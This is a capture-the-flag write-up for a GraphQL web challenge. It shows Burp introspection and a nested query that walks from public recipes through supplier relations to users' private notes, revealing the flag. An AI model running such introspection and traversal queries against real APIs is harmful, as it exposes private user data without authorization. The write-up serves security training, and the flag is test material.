<img width="522" height="453" alt="image" src="https://github.com/user-attachments/assets/20747a70-a211-46ae-b000-6c67ab2117fd" />

# Challenge

<img width="1912" height="770" alt="image" src="https://github.com/user-attachments/assets/5815079e-0a39-47ec-ae4c-808e0a964dce" />

On first load, the website only shows a set of cake cards (Lemon Drizzle, Vanilla Dream, etc). Nothing sensitive is visible on the surface.  

When looking at the source, we can see the frontend uses a `fetch('/graphql')` call:

```javascript
fetch('/graphql', {
   method: 'POST',
   headers: { 'content-Type': 'application/json' },
   body: JSON.stringify({ query: `query { publicRecipes { name description author { displayName } ingredients { name } } }` })
})
```

This confirmed the backend is a GraphQL API. The frontend is simply querying publicRecipes and rendering the results into the page.

## Solution

1) Inspecting traffic in Burp shows a `/graphql` endpoint handling queries.

   <img width="541" height="454" alt="image" src="https://github.com/user-attachments/assets/ddf74367-ebe5-4b96-8def-76ee656b81f9" />

2) Set introspection query

   Right-click the request in Burp, **GraphQL → Set introspection query**. This reveals the schema and available fields.

   <img width="584" height="333" alt="image" src="https://github.com/user-attachments/assets/60007f7b-c273-4436-9a3d-bb32fce50f55" />

3) Visualize the schema

   To better understand the GraphQL structure, the introspection result was loaded into [GraphQL Visualizer](http://nathanrandal.com/graphql-visualizer/).

   <img width="1899" height="794" alt="image" src="https://github.com/user-attachments/assets/9699d763-c0d3-4e6e-a92a-a82bdbe9fa54" />

   This confirmed:
    - **Query root:** `publicRecipes` (allowed), `secretRecipes` (exists, protected), `me`.
    - **Path from public to sensitive:**
      `publicRecipes → Recipe → ingredients → supplier → owner → privateNotes`
    
    **Conclusion:** We can reach `User.privateNotes` via `publicRecipes` without using `secretRecipes`.
  
## Flag
  
4) Expand `publicRecipes` to traverse relations (get the flag)

   Using Burp Repeater, send a deep query that walks the graph from `publicRecipes` → `Recipe` → `ingredients` → `supplier` → `owner` → `privateNotes`:
    
   ```graphql
    query {
       publicRecipes {
          name
          description
          author {
            notes
          }
          ingredients {
            supplier {
              owner {
                privateNotes
              }
            }
          }
        }
      }
   ```
   
   <img width="1370" height="679" alt="image" src="https://github.com/user-attachments/assets/f9c0cc4e-47a5-4427-bacc-1f40752bf2a3" />

    ```
    brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}
    ```
